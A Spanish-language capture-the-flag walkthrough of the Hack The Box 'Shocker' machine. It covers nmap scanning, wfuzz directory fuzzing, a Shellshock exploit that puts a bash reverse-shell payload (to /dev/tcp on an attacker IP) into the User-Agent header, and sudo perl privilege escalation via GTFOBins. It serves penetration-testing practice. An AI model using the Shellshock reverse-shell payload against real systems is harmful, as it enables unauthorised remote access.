
#  SHOCKER MACHINE

**Autor: Christian Jimenez**

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SHOCKER/images/1.png)

## ESCANEO Y ENUMERACION

vamos a realizar un escaneo con nmap:

```bash
nmap -p- --open -T5 -v -n 10.10.10.56 -oG allPorts
```

La salida nos muesta los sigueinets puertos:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SHOCKER/images/2.png)

Vamos a realizar una enumeracion de los servicios en los puertos:

```bash
nmap -p -sV -sC 10.10.10.56 -oN targeted
```

este es el resultado:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SHOCKER/images/3.png)

## EXPLOTACION

Vemos que tiene una pagina en el puerto 80 veamosla:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SHOCKER/images/4.png)

no hay algo interesante, vamos a fuzzear haber si encontramos un directorio, En este caso el mejor diccionario fue **/usr/share/dirb/wordlists/common.txt** porque nos reporte lo mejor posible, los diccionarios que siempre debes usar son:

```bash
/usr/share/dirb/wordlists/common.txt
/usr/share/wordlists/rockyou.txt
/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
```

```bash
wfuzz -c --hw=71 --hc=404 -w /usr/share/dirb/wordlists/common.txt http://10.10.10.56/FUZZ
```

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SHOCKER/images/5.png)

vemos un directorio **cgi-bin** esto huele a ataque shell shock, si vemos esa ruta en el navegador no hay nada:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SHOCKER/images/6.png)

pero vamos a fuzzear ahora ese directorio pero vamos a colocar la extension.cgi a los archivos:

```bash
wfuzz -c --hw=71 --hc=404 -w /usr/share/dirb/wordlists/common.txt http://10.10.10.56/cgi-bin/FUZZ.cgi
```

pero no reporto nada interesante:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SHOCKER/images/7.png)

vamos a intentar buscar con otras extensiones:

```bash
wfuzz -c -t 50 --hw=71 --hc=404 -w /usr/share/dirb/wordlists/common.txt extensiones.txt http://10.10.10.56/cgi-bin/FUZZ.FUZ2Z
```

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SHOCKER/images/8.png)

ahora si mostro algo:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SHOCKER/images/9.png)

si vamos a esa ruta se nos desacrga un archivo

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SHOCKER/images/10.png)

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SHOCKER/images/11.png)

nada interesante, pero como esa ruta existe tocara interceptar con burp y jugar con el user agent:

capturamos la peticion a "http://10.10.10.56/cgi-bin/user.sh" y modificamos el user-agent con el siguiente payload de shellshock:

```bash
() { ignored;};/bin/bash -i >& /dev/tcp/10.10.14.16/4242 0>&1
```

nos colocamos en la escucha en netcat y mandamos la peticion y obtenemos una reverse shell:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SHOCKER/images/12.png)

podemos ver la flag:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SHOCKER/images/13.png)


## ELEVACION DE PRIVILEGIOS

veamos que puede ejecutar como sudo:

```bash
sudo -l
```

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SHOCKER/images/14.png)

vemos que puede ejecutar perl, vamos a buscar en [https://gtfobins.github.io/](https://gtfobins.github.io/).

encontramos lo siguiente si tenemos los permisos sudo:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SHOCKER/images/15.png)

copiamos y lo ejecutamos, ahora somos root y podemos ver la flag:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SHOCKER/images/16.png)

### NOTA

A la hora de escalar privilegios revisar siempre GTFOBins para permisos sudo  o SUID.